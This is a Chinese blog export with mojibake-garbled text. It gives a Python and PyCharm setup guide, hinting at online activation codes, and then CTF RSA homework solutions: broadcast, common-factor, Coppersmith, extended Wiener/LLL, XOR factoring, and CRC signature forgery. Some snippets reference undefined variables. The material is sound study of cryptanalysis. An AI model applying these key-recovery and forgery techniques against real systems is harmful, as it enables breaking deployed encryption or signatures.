<p>é¦–å…ˆå»<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">é•œåƒç«™</a>ä¸‹è½½anacondaçš„é•œåƒ</p>
<p><img src="https://s2.loli.net/2022/09/27/47ldkv5GrE2PFDX.png"></p>
<span id="more"></span>
<p>å®‰è£…anaconda</p>
<p><img src="https://s2.loli.net/2022/09/27/C3b1p9ikwUmAfzY.png"></p>
<p>ç¬¬ä¸€ä¸ªå¿…é€‰ï¼Œç¬¬äºŒä¸ªä¼šåœ¨ç”µè„‘è£…ä¸€ä¸ªpython3.7ï¼Œå¦‚æœæ²¡æœ‰pythonç¯å¢ƒå‹¾é€‰</p>
<h2 id="å®‰è£…pycharm">2.å®‰è£…pycharm</h2>
<p>å»<a href="https://www.jetbrains.com/zh-cn/pycharm/download/#section=windows">å®˜ç½‘</a>ä¸‹è½½pycharmä¸“ä¸šç‰ˆï¼Œåœ¨ç½‘ä¸Šæœ‰å‡ ç‡å¯ä»¥æ‰¾åˆ°å¯ç”¨çš„æ¿€æ´»ç ï¼Œæˆ–è€…å¯ä»¥å»jetbrainçš„å®˜ç½‘è¿›è¡Œ<a href="https://www.jetbrains.com/shop/eform/students">å­¦ç”Ÿè®¤è¯</a>.</p>
<p><img src="https://s2.loli.net/2022/09/27/hquUvejQmnFRENG.png"></p>
<p>1å’Œ3éƒ½æ˜¯å¯é€‰ï¼Œ1æ˜¯åœ¨æ¡Œé¢åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œ3æ˜¯åœ¨å³é”®èœå•åˆ›å»ºæ‰“å¼€æ–¹å¼</p>
<p>æ‰“å¼€åå¯ä»¥åœ¨<img src="https://s2.loli.net/2022/09/27/NdHJ89pzf3hTIs4.png"></p>
<p>ç™»å½•æœ‰å­¦ç”Ÿä¼˜æƒ çš„è´¦å·ï¼Œä¹Ÿå¯ä»¥åœ¨<img src="https://s2.loli.net/2022/09/27/QhaFLuIWmsGonkj.png"></p>
<p>è¾“å…¥ç½‘ä¸Šæ‰¾çš„å¯ç”¨çš„æ¿€æ´»ç ã€‚</p>
<p>æ–°å»ºä¸€ä¸ªé¡¹ç›®</p>
<p><img src="https://s2.loli.net/2022/09/27/CBk72cvTs4UGPIj.png"></p>
<p><img src="https://s2.loli.net/2022/09/27/a7OE9GoWF3M41w6.png"></p>
<p><img src="https://s2.loli.net/2022/09/27/7q1YoTiPVEk8p64.png"></p>
<p>é€‰æ‹©Anacondaä¸‹çš„python.exeæ–‡ä»¶</p>
<p>å¯ä»¥è¿è¡Œå³å¯</p>
<p><img src="https://s2.loli.net/2022/09/27/SJuLzUbTZNF3Iaw.png"></p>
<p>ç„¶åç”¨pipå®‰è£…å¸¸ç”¨åŒ…</p>
<p>åœ¨cmdä¸­è¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>
<p>å‡çº§pipç‰ˆæœ¬ï¼Œç„¶åè¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
<p>å’Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å¯†ç éœ€è¦çš„Cryptoåº“å’Œpwnéœ€è¦çš„pwntoolsã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>å…­æœˆä½œä¸š</title>
    <url>/2022/06/30/%E5%85%AD%E6%9C%88%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h1 id="å…­æœˆä½œä¸š">å…­æœˆä½œä¸š</h1>
<h2 id="rsa-file">*RSA File</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub.key&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    text=file.read()</span><br><span class="line">key=RSA.import_key(text)</span><br></pre></td></tr></table></figure>
<p><a href="http://www.hiencode.com/pub_asys.html">åœ¨çº¿ç½‘ç«™</a></p>
<span id="more"></span>
<h2 id="åªæœ‰0åˆ°4">åªæœ‰0åˆ°4ï¼Ÿ</h2>
<p>å¹¿æ’­æ”»å‡»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">int</span>(<span class="built_in">str</span>(n1), <span class="number">5</span>)</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">str</span>(c1), <span class="number">5</span>)</span><br><span class="line">n2 = <span class="built_in">int</span>(<span class="built_in">str</span>(n2), <span class="number">5</span>)</span><br><span class="line">c2 = <span class="built_in">int</span>(<span class="built_in">str</span>(c2), <span class="number">5</span>)</span><br><span class="line">n3 = <span class="built_in">int</span>(<span class="built_in">str</span>(n3), <span class="number">5</span>)</span><br><span class="line">c3 = <span class="built_in">int</span>(<span class="built_in">str</span>(c3), <span class="number">5</span>)</span><br><span class="line">N = [n1, n2, n3]</span><br><span class="line">C = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">resultant, mod = crt(N, C)</span><br><span class="line">value = iroot(resultant, e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(value))</span><br></pre></td></tr></table></figure>
<p>å¦ä¸€ç§æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(n[i], n[j]) != <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, j)  <span class="comment"># è¾“å‡ºå¯¹åº”çš„nçš„åºå·</span></span><br><span class="line">                p = gmpy2.gcd(n[i], n[j])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>, p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>, q)</span><br><span class="line">                d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;d = &quot;</span>, d)</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i], d, n[i])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;m = &quot;</span>, m)</span><br></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªnæœ‰å…¬å› å­ï¼Œç›´æ¥æ±‚è§£</p>
<h2 id="rsa">RSAï¼Ÿ</h2>
<p>ç›´æ¥çˆ†ç ´m</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c1= <span class="number">47916081717706538925639104682570684180170502544820197539239827441426724468768104306254078605230687136184497929</span></span><br><span class="line">n1= <span class="number">164133678169710886720989064489094710242148933867688762980230890673424334054283751851389412792855634009922402873730095480540590589967587744481839586009206921690415208556737311431588106941893527836076971942678255228990259381439694065742253470463684082142779114879828632048097049587164541575068678559785497341341</span></span><br><span class="line">c2= <span class="number">63878844405215916614306503133484342687866237414982537489487243642156715327887644418701791728466044672606833177790745723348407141495434918350324367721472060206442057535810542180796122799773614557047720846326110736372382283280049448530028736552356917154044523343646598823659486063811304671208433254991406080968</span></span><br><span class="line">n2= <span class="number">81943314005002234143294576769951701354140501422348161833411886396153974002840590020014331444356263770668675416273077939014396178809052011274358602695903955726427501943378842406211922876951617483948075311923120200295968581991729752554553727773176109055672586268192629406914315361730879469185143748796847985621</span></span><br><span class="line">e2=<span class="number">3</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(gmpy2.iroot(c2+k*n2,e2)[<span class="number">1</span>]==<span class="literal">False</span>):</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#print(k,c2+k*n2,gmpy2.iroot(c2+k*n2,e2)[0])</span></span><br><span class="line"><span class="comment">#m2=3997474330692954004892367968364354963663898428651951374234371210083046726737590992626245650194376316882</span></span><br><span class="line">e1=<span class="number">2</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(gmpy2.iroot(c1+k*n1,e1)[<span class="number">1</span>]==<span class="literal">False</span>):</span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line"><span class="comment">#print(k,c1+k*n1,gmpy2.iroot(c1+k*n1,e1)[0])</span></span><br><span class="line">m=<span class="number">6922144300555033858896226859793246979270479673047458173</span></span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="break_rsa">Break_RSA</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">25348605574630284342864323710011622959543974652863854537355760576386763162531478272446867731299572532294812374775121121761898206639041068156270466457595336452690367719842145233764550634280981441631262047763246059814963741143303914063537003244814908763379320576260885158458898112416692583017869283284022878603506583499699525249773663841642694427307104140944360804367072787670581252816486834658346431010523135392357008103555699542414687172408709153334263858639251735462278292703380745537045458408951791720967957274781161667526873251066303708008043058246747534357368350540174588670636827470901518225473676343782182718627</span></span><br><span class="line">p4 =<span class="number">0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span> </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4096</span>):</span><br><span class="line">    p4=<span class="number">0x3e67e7cacd2584224fb2026b40afbcc4281bd59f72f7801239d95c61c48ded7649924f794592fce806e032f16c2f4a90466905fc30037317074a6424d8bf078e959a1ed2d8e5c000</span></span><br><span class="line">    p4=p4+<span class="built_in">int</span>(<span class="built_in">hex</span>(i),<span class="number">16</span>)</span><br><span class="line">    kbits = pbits - p4.nbits()</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p4</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>( <span class="string">&quot;n: &quot;</span>, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>, p)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;q: &quot;</span>, n//p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)   </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
æ¨¡æ•°ä¸ºN,Nå…·æœ‰ä¸€ä¸ªå› å­b&gt;=N^Î², 0&lt;Î²&lt;=1.
\]</span></p>
<p>Coppersmith methodä¸»è¦é€šè¿‡LLLæ–¹æ³•æ‰¾åˆ°ä¸è¯¥å¤šé¡¹å¼å…·æœ‰ç›¸åŒæ ¹x0ï¼Œå®šä¹‰åŸŸä¸ºæ•´æ•°åŸŸçš„å¤šé¡¹å¼gï¼Œå³å¯æ±‚è§£ã€‚</p>
<h3 id="lllç®—æ³•">LLLç®—æ³•</h3>
<p>LLLç®—æ³•çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªå‘é‡ç©ºé—´çš„è¿‘ä¼¼æœ€çŸ­æ­£äº¤åŸºã€‚LLLçš„çº¦åŒ–è¿‡ç¨‹ï¼Œæ˜¯å…ˆçº¦åŒ–å‰kä¸ªåŸºï¼Œç„¶åæ‹“å±•åˆ°k+1ä¸ªåŸºï¼Œæœ€ç»ˆå®Œæˆå…¨éƒ¨nä¸ªåŸºçš„çº¦åŒ–è¿‡ç¨‹ã€‚å› ä¸ºè¿‘ä¼¼æœ€çŸ­ï¼Œæ‰€ä»¥è¯¥ç®—æ³•å¯æ±‚è§£éƒ¨åˆ†SVPé—®é¢˜ï¼Œè¿›è€Œæ±‚è§£coppersmithé—®é¢˜ã€‚</p>
<h2 id="babyrsa">babyrsa</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p_high = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">q_low = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">enc = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">mod = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">265</span>)</span><br><span class="line">p0 = n * inverse_mod(q_low,mod) % mod</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">    f = p_high * (<span class="number">2</span>^<span class="number">724</span>) + p0 + (x * <span class="number">32</span> + i) * mod</span><br><span class="line">    f = f.monic()</span><br><span class="line">    out_p = f.small_roots(<span class="number">2</span>^<span class="number">454</span>,<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(out_p) != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(out_p[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = out_p[<span class="number">0</span>] * <span class="number">32</span> + i * mod + p_high * (<span class="number">2</span>^<span class="number">724</span>) + p0</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line">p = <span class="number">133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407</span></span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line">fai_n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,fai_n)</span><br><span class="line">m = <span class="built_in">pow</span>(enc,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.decode(long_to_bytes(m)))</span><br></pre></td></tr></table></figure>
<p>q_lowå¯ä»¥é€šè¿‡né€†åˆ°p_lowï¼Œé€šè¿‡small_rootsæ±‚è§£</p>
<h2 id="wieners-attack">Wienerâ€™s Attack</h2>
<p>è¿åˆ†æ•°å®šç† <span class="math display">\[
å½“|xâˆ’\frac{a}{b}|&lt;\frac{1}{2b^2}æ—¶ï¼Œ\frac{a}{b}æ˜¯xçš„ä¸€ä¸ªè¿åˆ†æ•°è¿‘ä¼¼ã€‚
\]</span> ç”¨tå’Œ_nèƒ½æ±‚å‡ºuï¼Œä½†æ˜¯åœ¨æ±‚uçš„è¿‡ç¨‹ä¸­å¯æ±‚på’Œqã€‚</p>
<p>æ±‚å‡ºe1åï¼Œe1å’Œe2å¯ä»¥ç”¨æ‰©å±•ç»´çº³æ±‚è§£mã€‚</p>
<h3 id="æ‰©å±•ç»´çº³">æ‰©å±•ç»´çº³</h3>
<p><span class="math display">\[
g = gcd(p-1, q-1) \\
ed = 1 + k(p-1)(q-1)\\
edg = g + k(p-1)(q-1)\tag{1}
\]</span></p>
<p><span class="math display">\[
e_1d_1 = 1+k_1\phi(N)\\
e_2d_2 = 1+k_2\phi(N)\\
e_1d_1k_2-e_2d_2k_1=k_2-k_1\tag{2}
\]</span></p>
<p>ä»è€Œå¯å¾— <span class="math display">\[
A*L=B\\
A=(k_1k_2,d_1gk_2,d_2gk_1, d_1d_2g^2)\\
L=\begin{bmatrix}
1&amp;-N&amp;0&amp;N^2\\
0&amp;e_1&amp;-e_1&amp;-e_1N\\
0&amp;0&amp;-e_2&amp;-e_2N\\
0&amp;0&amp;0&amp;e_1e_2
\end{bmatrix}\\
B=(k_1k_2,k_2(g+k_1s),g(k_1âˆ’k_2),(g+k_1s)(g+k_2s))
\]</span> Lä¸ºæ ¼åŸºï¼Œè‹¥Bä¸ºæœ€çŸ­å‘é‡å¯ç”¨LLLæ±‚è§£ã€‚ <span class="math display">\[
åªæœ‰æ»¡è¶³\lambda_1(L)\le\sqrt{N}det(L)^\frac{1}{n}æ‰æ˜¯æœ€çŸ­å‘é‡ã€‚
\]</span> ç°æˆçš„æ ¼å­ï¼š <span class="math display">\[
M_1=N^{0.5}, M_2=N^{1+\alpha},\\
Lç¬¬ä¸€åˆ—ä¹˜Nï¼Œç¬¬äºŒåˆ—ä¹˜M_1, ç¬¬ä¸‰åˆ—ä¹˜M_2,å¾—\\
L_2=\begin{bmatrix}
N&amp;-M_1N&amp;0&amp;N^2\\
0&amp;M_1e_1&amp;-M_2e_1&amp;-e_1N\\
0&amp;0&amp;-M_2e_2&amp;-e_2N\\
0&amp;0&amp;0&amp;e_1e_2
\end{bmatrix}\\
B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
æ‰€ä»¥||B_2||\le2N^{1+2\alpha}\le\sqrt{N}det(L)^\frac{1}{n}=2N^{\frac{1}{4}(\alpha+\frac{13}{2})}\\
æ±‚å¾—\alpha\le\frac{5}{14}.\\
ç„¶åå¯ä»¥å°†\alphaå¸¦å…¥M_2ç”¨LLLæ±‚æœ€çŸ­å‘é‡B_2ï¼Œå³ä¹˜L_2çš„é€†æ±‚Aï¼Œç”±Açš„å‰ä¸¤é¡¹æ±‚è§£ã€‚
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">c = <span class="number">6472367338832635906896423990323542537663849304314171581554107495210830026660211696089062916158894195561723047864604633460433867838687338370676287160274165915800235253640690510046066541445140501917731026596427080558567366267665887665459901724487706983166070740324307268574128474775026837827907818762764766069631267853742422247229582756256253175941899099898884656334598790711379305490419932664114615010382094572854799421891622789614614720442708271653376485660139560819668239118588069312179293488684403404385715780406937817124588773689921642802703005341324008483201528345805611493251791950304129082313093168732415486813</span></span><br><span class="line">e2 = <span class="number">27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line">e1 = <span class="number">114552459553730357961013268333698879659007919035942930313432809776799669181481660306531243618160127922304264986001501784564575128319884991774542682853466808329973362019677284072646678280051091964555611220961719302320547405880386113519147076299481594997799884384012548506240748042365643212774215730304047871679706035596550898944580314923260982768858133395187777029914150064371998328788068888440803565964567662563652062845388379897799506439389461619422933318625765603423604615137217375612091221578339493263160670355032898186792479034771118678394464854413824347305505135625135428816394053078365603937337271798774138959</span></span><br><span class="line">N  = <span class="number">14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line">a  = <span class="number">0.356</span><span class="comment">#731./2049</span></span><br><span class="line">M1=N**<span class="number">0.5</span></span><br><span class="line">M2= N **(a+<span class="number">1</span>)</span><br><span class="line">D = diagonal_matrix(ZZ,[N,M1,M2,<span class="number">1</span>])</span><br><span class="line">M=matrix(ZZ,[[<span class="number">1</span>,-N,<span class="number">0</span>,N**<span class="number">2</span>],[<span class="number">0</span>,e1,-e1,-e1*N],[<span class="number">0</span>,<span class="number">0</span>,e2,-e2*N],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2]])*D</span><br><span class="line">L=M.LLL()</span><br><span class="line">t=vector(ZZ,L[<span class="number">0</span>])</span><br><span class="line">x=M.solve_left(t)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">phi = <span class="built_in">int</span>(x[<span class="number">1</span>]/x[<span class="number">0</span>]*e1)</span><br><span class="line">d = invert(<span class="number">0x10001</span>,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">9082754779802416065229245885387712939943943582794993779715278978532329981453479995551082109</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = gcd(p-1, q-1)</span></span><br><span class="line"><span class="string">çŸ©é˜µAç­‰äº[k1k2, d1gk2, d2gk1, d1d2g^2] å³ä¸ºx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="xor_1">xor_1</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">n, x</span>):</span><br><span class="line">    a = [<span class="number">0</span>]</span><br><span class="line">    b = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        xbit = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        nbit = n % maskn</span><br><span class="line">        t_a = []</span><br><span class="line">        t_b = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            <span class="keyword">for</span> aa <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> bb <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">if</span> aa ^ bb == xbit:</span><br><span class="line">                        tmp2 = n % maskn</span><br><span class="line">                        tmp1 = (aa * maskn // <span class="number">2</span> + a[j]) * (bb * maskn // <span class="number">2</span> + b[j]) % maskn</span><br><span class="line">                        <span class="keyword">if</span> tmp1 == tmp2:</span><br><span class="line">                            t_a.append(aa * maskn // <span class="number">2</span> + a[j])</span><br><span class="line">                            t_b.append(bb * maskn // <span class="number">2</span> + b[j])</span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        a = t_a</span><br><span class="line">        b = t_b</span><br><span class="line">    <span class="keyword">for</span> a1, b1 <span class="keyword">in</span> <span class="built_in">zip</span>(a, b):</span><br><span class="line">        <span class="keyword">if</span> a1 * b1 == n1:</span><br><span class="line">            <span class="keyword">return</span> a1, b1</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸€ä½å¼‚æˆ–éƒ½æœ‰å››ç§æƒ…å†µï¼ˆ00,01,10,11ï¼‰é€šè¿‡nçš„ä½ä½å¯ä»¥çº¦æŸè¿™å››ç§æƒ…å†µï¼Œä»ä½ä½åˆ°é«˜ä½ä¾æ¬¡éå†å¯è§£ã€‚</p>
<h2 id="rsaos">RSAOS</h2>
<p>æ™®é€šæŒ‡ä»¤å…ˆCRCç­¾åå†RSAç­¾åï¼Œç‰¹æƒæŒ‡ä»¤å…ˆfoldhashç­¾åå†RSAç­¾åã€‚å½“enableæ‰“å¼€æ—¶ï¼Œæ™®é€šæŒ‡ä»¤ä¹Ÿéœ€è¦foldhashç­¾åã€‚</p>
<p>foldhashå®ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sha1_s = sha1(s).digest()</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(sha1_s[:<span class="number">10</span>], sha1_s[<span class="number">10</span>:]))</span><br></pre></td></tr></table></figure>
<p>ç”±äºç¨‹åºçš„åˆ¤æ–­æ¡ä»¶ï¼ŒæŒ‡ä»¤åå¯ä»¥è·Ÿå…¶ä»–å­—ç¬¦ï¼Œç­¾åæ—¶æ˜¯ç­¾ä¸€æ•´ä¸ªæŒ‡ä»¤ã€‚</p>
<p>ç„¶åä¾¿å¯ä»¥æ‰¾åˆ°å¤šä¸ªCRCçš„ç­¾åä½¿ä¹‹ä¹˜ç§¯ç­‰äºget-flagçš„foldhashç­¾åï¼Œåˆç”±äºRSAçš„ä¹˜æ³•åŒæ€ï¼Œæœ€åç­¾åå¾—å‡ºçš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p>
<p>äºæ˜¯å°±å¯ä»¥<a href="%5Bresilar/crchack:%20Reversing%20CRC%20for%20fun%20and%20profit%20(github.com)%5D(https://github.com/resilar/crchack)">CRCæ±‚é€†</a>ï¼Œæ¯ä¸ªfoldhashçš„å› å­ä¸åº”è¯¥è¶…è¿‡CRC32è¦æ±‚çš„32ä½ã€‚å¯é€‰æ‹©get-flag 999ã€‚</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
